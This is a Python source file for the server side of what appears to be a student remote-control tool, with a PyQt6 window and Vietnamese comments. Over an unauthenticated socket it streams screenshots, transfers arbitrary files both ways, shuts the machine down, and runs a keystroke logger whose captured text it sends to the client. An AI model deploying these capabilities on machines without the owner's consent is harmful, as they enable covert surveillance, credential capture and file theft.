import sys
import os
import cv2
import json
import struct
import io
import mss
import numpy as np
import socket
import pickle
import time
import threading
import pyautogui
import subprocess
from PIL import Image
from PIL import ImageGrab
from pynput import keyboard
from PyQt6.uic import load_ui
from threading import Thread
from PyQt6.QtGui import QPixmap
from server_ui import Ui_Dialog_server
from pynput.keyboard import Listener, Key
from PyQt6.QtWidgets import QApplication, QMainWindow, QDialog,QMessageBox,QFileDialog  

HOST=''
PORT= 8080

class Window(QMainWindow):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.ui = Ui_Dialog_server()
        self.ui.setupUi(self)
        self.check = False
        self.ui.pushButton.clicked.connect(self.toggle_action)
    # Phương thức kích hoạt / ngừng hoạt động của server khi nhấn nút
    def toggle_action(self):
        if not self.check:
            self.check = True
            self.ui.pushButton.setText("Stop")
            self.start_server()# Bắt đầu chạy server khi nút được nhấn
        else:
            self.check = False
            sys.exit()# Thoát ứng dụng khi nút được nhấn lần nữa
    def start_server(self):
        global keylog
        global unhook
        def ChangeImage():
            try:
                print("[SERVER]: CONNECTED: {0}!".format(addr[0]))
                while True:
                    img = ImageGrab.grab()
                    img_bytes = io.BytesIO()
                    img.save(img_bytes, format='PNG')
                    size = len(img_bytes.getvalue())
                    conn.sendall(size.to_bytes(4, byteorder='big'))
                    conn.sendall(img_bytes.getvalue())
             
                conn.sendall(b'ok')
            except ConnectionResetError:
                print("[SERVER]: DISCONNECTED: {0}!".format(addr[0]))
                conn.close()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
           s.bind((HOST,PORT))
           s.listen()
           while True:
             print("server ",HOST,":",str(PORT)," wait")
             conn, addr = s.accept()
             with conn:
                print('Connected by',addr)
                while True:
                    print("listening")
                    data = conn.recv(1024)
                    print(data)
                    self.in_stream = conn.makefile('rb')
                    self.out_stream = conn.makefile('wb')
                    if not data:
                        break
                    data=data.decode()
                    x=data.split('//')
                    if x[0]=="quit":
                        break
                    if x[0]=="ping":
                        pass
                    if x[0] == "capture":
                        img = ImageGrab.grab(bbox=None)
                        img.save("tmp_capture.jpg")
                        f = open("tmp_capture.jpg", 'rb')
                        print("Sending data...")
                        l = f.read(4096)
                        while l:
                           conn.send(l)
                           l = f.read(4096)
                        f.close()
                        print("Data sent successfully.")
                        conn.sendall(b'ok')
                        print('Sent confirmation: ok')

                    if x[0] == "startcapture":
                        start_thread = Thread(target=ChangeImage, daemon=True)
                        start_thread.start()

                    if data == "send":
                        print("Receive up file request")
                        self.send_file()
                    
                    if data == "receive":
                        print("Receive down file request")
                        self.receive_file()
                                
                    if x[0]=="shutdown":
                        try:
                            os.system("shutdown /s /t 1")
                            conn.sendall(b'ok')
                        except:
                            conn.sendall(b'404')
                    if x[0]=="key":
                        if x[1]=="unhook":
                            conn.sendall(b"ok")
                            unhook=True
                        if x[1]=="getkey":
                            if keylog=="":
                                keylog="404"
                            encoded_keylog = keylog.encode('utf-8')
                            conn.sendall(encoded_keylog)
                            keylog=""
                        if x[1]=="hook":
                            if unhook==True:
                                unhook=False
                                conn.sendall(b'ok')
                                listener = keyboard.Listener(on_press=on_press)
                                listener.start()
    
    def receive_file(self):
      try:
        # Receive the raw bytes of the file path
        file_path_bytes = self.in_stream.readline().strip()

        # Convert bytes to string representation for display
        file_path_display = file_path_bytes.decode('utf-8', 'replace')

        file_size = int(self.in_stream.readline().decode('utf-8').strip())
        print(f"Received file: {file_path_display} (Size: {file_size} bytes)")

        # Convert the file path bytes to string for writing to file
        file_path = file_path_bytes.decode('utf-8', 'replace')

        # Ensure the directory exists before attempting to write the file
        directory = os.path.dirname(file_path)
        if not os.path.exists(directory):
            os.makedirs(directory)

        with open(file_path, 'wb') as file_output:
            while file_size > 0:
                buffer_size = min(1024, file_size)
                buffer = self.in_stream.read(buffer_size)
                if not buffer:
                    break
                file_output.write(buffer)
                file_size -= len(buffer)

        print("File transfer completed")

      except Exception as e:
        print(f"Error: {e}")


    def send_file(self):
      try:
        # Đọc đường dẫn tệp từ client
        file_path = self.in_stream.readline().decode('utf-8').strip()

        # Kiểm tra xem tệp có tồn tại không
        if not os.path.exists(file_path):
            raise FileNotFoundError(f"Không tìm thấy tệp: {file_path}")

        # Lấy kích thước tệp
        file_size = os.path.getsize(file_path)

        # Gửi thông tin tệp đến client
        file_info = f"{file_path}\n{file_size}\n"
        self.out_stream.write(file_info.encode('utf-8'))
        self.out_stream.flush()  # Đảm bảo dữ liệu được gửi ngay lập tức
        print(f"Gửi tệp: {file_path} (Kích thước: {file_size} byte)")

        # Mở tệp và gửi dữ liệu theo từng phần nhỏ
        with open(file_path, 'rb') as file_input:
            for buffer in iter(lambda: file_input.read(1024), b''):
                self.out_stream.write(buffer)
                self.out_stream.flush()

        print("Chuyển tệp hoàn thành")

      except FileNotFoundError as e:
        print(f"Lỗi: {e}")
        # Gửi thông báo về lỗi cho client nếu cần thiết
        error_message = f"Error: {e}\n"
        self.out_stream.write(error_message.encode('utf-8'))
        self.out_stream.flush()

      except Exception as e:
        print(f"Lỗi: {e}")
        # Gửi thông báo về lỗi cho client nếu cần thiết
        error_message = f"Error: {e}\n"
        self.out_stream.write(error_message.encode('utf-8'))
        self.out_stream.flush()
# Biến lưu trữ các phím được nhấn để ghi log
keylog = ""
# Biến kiểm soát việc ghi log
unhook = True
# Hàm xử lý sự kiện nhấn phím
def on_press(key):
    global keylog
    global unhook
    
    # Nếu biến unhook là True, không ghi log
    if unhook == True:
        return False
    if hasattr(key, 'char'):  
        keylog += key.char
    elif key == Key.space:  
        keylog += ' '
    elif key == Key.enter:  
        keylog += '\n'
    elif key == Key.tab:  
        keylog += '\t'
    elif key==key.backspace:  
        keylog = keylog[:-1]

# Lấy thông tin về hostname và IP
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
HOST = str(local_ip)
    
if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = Window()
    win.show()
    sys.exit(app.exec())
